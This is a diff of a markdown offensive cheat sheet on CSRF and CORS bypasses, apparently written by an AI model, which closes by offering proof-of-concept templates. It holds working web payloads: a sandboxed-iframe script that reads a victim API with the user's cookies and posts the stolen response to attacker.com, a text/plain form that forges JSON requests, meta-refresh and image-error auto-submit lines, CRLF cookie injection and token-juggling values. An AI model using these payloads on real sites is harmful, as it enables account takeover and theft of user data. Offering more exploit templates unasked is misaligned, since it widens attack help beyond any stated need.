@@ -1,55 +1,131 @@
-### ✅ Basics
 
-1. **Use GET if possible**: Some endpoints allow sensitive actions via GET—use them directly for CSRF if CSRF protection isn’t enforced on GET.
-2. **Remove CSRF Token**: Try removing the `csrf` param if it’s not validated server-side.
-3. **Use Attacker's CSRF Token**: If token validation is weak (e.g., not session-bound), include a token from your own session.
-4. **_method Bypass**: Use `_method=POST` or `_method=PUT` in a GET request to trick frameworks that support method override.
+## 🌐 1. CORS Misconfigurations (Data Theft)
 
----
+CORS vulnerabilities allow you to bypass the **Same-Origin Policy (SOP)** to read sensitive data (API keys, PII, or CSRF tokens).
 
-### 🧠 Advanced Techniques
+|**Technique**|**Server-Side Flaw**|**Attacker Strategy**|
+|---|---|---|
+|**Null Origin**|Whitelists `null` origin|Use a sandboxed `<iframe>` to force `Origin: null`.|
+|**Suffix Bypass**|Matches `*test.com`|Register `attack-test.com`.|
+|**TLD/Subdomain**|Incomplete regex|Use `test.com.attacker.com` or `attacker.com/test.com`.|
+|**Reflection**|Echoes any `Origin`|Requires `Access-Control-Allow-Credentials: true`.|
 
-### 🍪 Cookie Handling
+### **The `null` Origin Payload**
 
-1. **Set-Cookie via Response Splitting**: Inject a `Set-Cookie` header via CRLF (`%0d%0a`) in query params to set your own CSRF token.
-2. **Leverage SameSite=Lax**: If the cookie is `SameSite=Lax`, a top-level GET request will include it—just trigger the CSRF with a link or image.
-3. **Target Image `onerror` for Form Submit**: Use `<img src=x onerror="document.forms[0].submit()">` to auto-submit forms.
-
-### 🏹 Redirect-Based CSRF
-
-1. **Open Redirect to CSRF URL**: If there's an open redirect, redirect the victim to a URL that triggers CSRF.
-2. **Relative Path Traversal Redirection**: Abuse redirect parameters like `postId=../../change-email?email=...` to point to CSRF endpoints.
-
-### 🧬 Content-Type Issues
-
-1. **Send POST without Content-Type**: Some servers don’t validate CSRF if `Content-Type` is missing or `text/plain`.
-2. **Multipart/Form-Data Override**: Use `<form enctype="multipart/form-data">` to bypass weak CSRF protections.
-
-### 🕵️ Recon & Exploitation
-
-1. **Check for CORS Misconfigs**: If CORS allows your origin, you can do CSRF with XHR and even read responses.
-2. **Check for Referer Validation**: If the app checks referer or origin, iframe or redirect-based CSRF may fail—test with image or meta refresh.
-
-### 🧨 Auto-CSRF Payloads
-
-1. **Auto Link Click (via JS)**:
-
-```html
-<script>
-  location = '<https://target.com/endpoint?param=value>';
-</script>
+HTML
 
 ```
-
-1. **Meta Refresh**:
-
-```html
-<meta http-equiv="refresh" content="0;url=https://target.com/endpoint?param=value">
-
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://victim.com/api/data', true);
+    xhr.withCredentials = true; 
+    xhr.onload = () => {
+        fetch('https://attacker.com/log', {method:'POST', body: btoa(xhr.responseText)});
+    };
+    xhr.send();
+</script>"></iframe>
 ```
 
 ---
 
-1- csrf=0
+## 📝 2. CSRF Bypass Logic (Unauthorized Actions)
 
-2-csrf[]=0
+### **A. Token & Parameter Juggling**
+
+- **Token Removal:** Delete the `csrf` parameter; some backends skip validation if it is missing.
+    
+- **Static/Type Bypass:**
+    
+    - `csrf=0` or `csrf=true`: Exploits loose comparisons (e.g., PHP `0 == "false"`).
+        
+    - `csrf[]=0`: Sends an **Array** to break string-only validation logic.
+        
+- **Attacker’s Token:** Use a token from your own valid session. Works if the backend checks token _validity_ but not _ownership_.
+    
+
+### **B. Protocol & Method Bypasses**
+
+- **Method Swapping:** Convert `POST` to `GET`.
+    
+- **`_method` Override:** Add `?_method=POST` to a `GET` request to trick frameworks like Laravel/Rails.
+    
+- **Content-Type Manipulation:**
+    
+    - Change `application/json` to `text/plain` to avoid CORS preflights.
+        
+    - Use `<form enctype="multipart/form-data">` to bypass WAFs looking for standard form encoding.
+        
+
+---
+
+## 🧬 3. Advanced Chaining & JSON Attacks
+
+### **🔗 CORS-to-CSRF (The Atomic Chain)**
+
+Used when CSRF is strong but CORS is weak. Must be "Atomic" (one script) to prevent token expiration/consumption by the victim.
+
+1. **Scrape:** Use CORS XHR to fetch the target page and its CSRF token.
+    
+2. **Execute:** Immediately `POST` the malicious action using that token.
+    
+
+### **⚔️ XSS-to-CSRF (The SameSite=Strict Killer)**
+
+When cookies are `SameSite=Strict`, traditional CSRF fails. Use XSS on the target domain to trigger the request. Since it is **Same-Origin**, the `Strict` cookie is sent.
+
+### **📦 JSON-Based CSRF**
+
+If a server expects JSON but doesn't strictly validate the `Content-Type` header:
+
+- **The "Dummy Key" Trick:** Use `enctype="text/plain"` in an HTML form to forge a JSON body.
+    
+
+HTML
+
+```
+<form action="https://victim.com/api" method="POST" enctype="text/plain">
+    <input name='{"email":"hacker@evil.com","ignore":"' value='"}'>
+</form>
+```
+
+---
+
+## 🏹 4. Delivery & Delivery Methods
+
+### **Cookie Handling**
+
+- **SameSite=Lax Bypass:** Triggered via top-level `GET`. Use `window.location` or `<a href="...">`.
+    
+- **CRLF Injection:** Inject `%0d%0aSet-Cookie: csrf=12345` to "fix" a token you already know for a Double Submit Cookie bypass.
+    
+
+### **Redirect-Based CSRF**
+
+- **Open Redirect:** Use `victim.com/redirect?url=...` to bypass `Referer` checks; the request appears to originate from the trusted domain.
+    
+- **Path Traversal:** Abuse redirect params like `postId=../../change-email?email=...`.
+    
+
+### **Auto-Execution**
+
+- **Meta Refresh:** `<meta http-equiv="refresh" content="0;url=https://target.com/api?action=delete">`
+    
+- **Image Error:** `<img src=x onerror="document.forms[0].submit()">`
+    
+
+---
+
+## 🕵️ Quick Recon Checklist
+
+- [ ] Check `Origin: null` via sandboxed iframe.
+    
+- [ ] Try `csrf=0`, `csrf[]=` or removing the token entirely.
+    
+- [ ] Attempt to convert `POST` to `GET` for sensitive actions.
+    
+- [ ] Test if the API accepts `text/plain` instead of `application/json`.
+    
+- [ ] If `SameSite=Strict` is active, hunt for XSS to perform the CSRF.
+    
+
+**Would you like me to create a specific proof-of-concept template for any of these individual techniques?**
